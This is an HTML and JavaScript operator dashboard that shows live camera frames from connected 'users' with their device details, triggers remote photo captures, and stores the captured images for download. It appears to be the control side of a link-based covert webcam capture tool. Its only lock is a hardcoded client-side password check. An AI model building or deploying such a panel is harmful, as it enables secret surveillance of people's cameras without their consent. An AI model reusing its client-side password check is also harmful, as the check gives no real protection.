<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin CCTV Surveillance Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .main-container {
            width: 100%;
            max-width: 1200px;
        }
        #loginOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #444;
            margin-bottom: 12px;
            width: 220px;
            text-align: center;
            background: #222;
            color: #fff;
        }
        button, select {
            background-color: #00e676;
            color: #000;
            border: none;
            padding: 10px 18px;
            font-size: 14px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #1e1e1e;
            padding: 15px 20px;
            border-radius: 8px;
            border: 1px solid #333;
            margin-bottom: 20px;
        }
        .cctv-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .cctv-card {
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
        }
        .cctv-header {
            background: #252525;
            padding: 8px 12px;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }
        .live-badge {
            background: #ff1744;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 4px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .cctv-body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200px;
            position: relative;
        }
        .cctv-body img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .cctv-footer {
            padding: 10px;
            background: #1e1e1e;
            display: flex;
            gap: 8px;
        }
        .cctv-footer button {
            flex: 1;
            padding: 6px;
            font-size: 12px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 15px;
            margin-top: 10px;
            max-height: 350px;
            overflow-y: auto;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 8px;
            background: #181818;
        }
        .photo-card {
            background: #252525;
            padding: 8px;
            border-radius: 6px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .photo-card img {
            width: 100%;
            border-radius: 4px;
        }
        .btn-download {
            background-color: #0288d1;
            color: white;
            text-decoration: none;
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 4px;
            margin-top: 5px;
        }
        .btn-delete {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 5px;
        }
    </style>
</head>
<body>

    <!-- Login Screen -->
    <div id="loginOverlay">
        <h2>🔒 Admin CCTV Control</h2>
        <input type="password" id="passInput" placeholder="Enter Password">
        <button onclick="login()">LOGIN</button>
        <p id="errMsg" style="color: #ff5252; display: none; margin-top: 10px;">Incorrect Password!</p>
    </div>

    <div class="main-container">
        <!-- Top Control Bar -->
        <div class="top-bar">
            <h2>🏢 CCTV Multi-Screen Surveillance</h2>
            <div>
                <span id="activeCount" style="margin-right: 15px; color: #00e676; font-weight: bold;">Active Users: 0</span>
                <button id="linkToggleBtn" onclick="toggleLinkState()" style="background-color: #2e7d32; color: white;">LINK: ACTIVE (ON)</button>
            </div>
        </div>

        <!-- CCTV Grid Container -->
        <h3>🔴 Live Camera Feeds (CCTV Grid View):</h3>
        <div class="cctv-grid" id="cctvGrid">
            <p id="noUsersMsg" style="grid-column: 1/-1; color: #777; text-align: center; padding: 40px;">No active users connected right now.</p>
        </div>

        <h3>📁 Captured Photo Gallery:</h3>
        <div class="gallery" id="photoGallery">
            <p id="emptyMsg" style="grid-column: 1/-1; color: #777; text-align: center;">No stored photos yet.</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let isLinkActive = true;

        // Subtle Beep Alert Sound using Web Audio API
        function playBeep() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'sine';
                osc.frequency.value = 800;
                gain.gain.value = 0.1;
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                setTimeout(() => osc.stop(), 150);
            } catch (e) {}
        }

        function login() {
            const pass = document.getElementById('passInput').value;
            if (pass === '12345') {
                document.getElementById('loginOverlay').style.display = 'none';
                socket.emit('admin-auth-success');
            } else {
                document.getElementById('errMsg').style.display = 'block';
            }
        }

        function toggleLinkState() {
            isLinkActive = !isLinkActive;
            const btn = document.getElementById('linkToggleBtn');
            if (isLinkActive) {
                btn.innerText = "LINK: ACTIVE (ON)";
                btn.style.backgroundColor = "#2e7d32";
            } else {
                btn.innerText = "LINK: DISABLED (OFF)";
                btn.style.backgroundColor = "#c62828";
            }
            socket.emit('admin-toggle-link', isLinkActive);
        }

        function captureUser(socketId) {
            socket.emit('admin-trigger-capture', socketId);
        }

        function deletePhoto(fileName, elementId) {
            socket.emit('delete-photo', fileName);
            const cardElem = document.getElementById(elementId);
            if (cardElem) cardElem.remove();
        }

        function renderPhotoCard(imageData, fileName) {
            playBeep();
            const emptyMsg = document.getElementById('emptyMsg');
            if (emptyMsg) emptyMsg.style.display = 'none';

            const cardId = `card_${fileName.replace(/[^a-zA-Z0-9]/g, '')}`;
            if (document.getElementById(cardId)) return;

            const gallery = document.getElementById('photoGallery');
            const card = document.createElement('div');
            card.className = 'photo-card';
            card.id = cardId;

            const img = document.createElement('img');
            img.src = imageData;

            const downBtn = document.createElement('a');
            downBtn.className = 'btn-download';
            downBtn.href = imageData;
            downBtn.download = fileName;
            downBtn.innerText = '💾 Download';

            const delBtn = document.createElement('button');
            delBtn.className = 'btn-delete';
            delBtn.innerText = '🗑️ Delete';
            delBtn.onclick = () => deletePhoto(fileName, cardId);

            card.appendChild(img);
            card.appendChild(downBtn);
            card.appendChild(delBtn);
            gallery.insertBefore(card, gallery.firstChild);
        }

        // Update active users list with device info
        socket.on('update-users-list', (usersList) => {
            const userIds = Object.keys(usersList);
            document.getElementById('activeCount').innerText = `Active Users: ${userIds.length}`;
            
            const grid = document.getElementById('cctvGrid');
            const noUsersMsg = document.getElementById('noUsersMsg');

            if (userIds.length === 0) {
                if (noUsersMsg) noUsersMsg.style.display = 'block';
                return;
            } else {
                if (noUsersMsg) noUsersMsg.style.display = 'none';
            }

            userIds.forEach((id, index) => {
                let boxId = `cctv_${id}`;
                let card = document.getElementById(boxId);
                const userInfo = usersList[id].deviceInfo || "Unknown Device";

                if (!card) {
                    playBeep();
                    card = document.createElement('div');
                    card.className = 'cctv-card';
                    card.id = boxId;
                    card.innerHTML = `
                        <div class="cctv-header">
                            <span>CAM #${index + 1}: ${userInfo}</span>
                            <span class="live-badge">LIVE</span>
                        </div>
                        <div class="cctv-body">
                            <img id="img_${id}" src="" alt="Connecting feed...">
                        </div>
                        <div class="cctv-footer">
                            <button onclick="captureUser('${id}')" style="background:#ff1744; color:#fff;">📸 Capture</button>
                        </div>
                    `;
                    grid.appendChild(card);
                }
            });

            Array.from(grid.children).forEach(child => {
                if (child.id && child.id.startsWith('cctv_')) {
                    const socketId = child.id.replace('cctv_', '');
                    if (!usersList[socketId]) {
                        child.remove();
                    }
                }
            });
        });

        socket.on('update-live-stream', (data) => {
            const imgElem = document.getElementById(`img_${data.socketId}`);
            if (imgElem) {
                imgElem.src = data.frameData;
            }
        });

        socket.on('load-stored-photos', (photosArray) => {
            photosArray.forEach(item => renderPhotoCard(item.imageData, item.fileName));
        });

        socket.on('send-photo-to-admin', (data) => {
            renderPhotoCard(data.imageData, data.fileName);
        });
    </script>
</body>
</html>
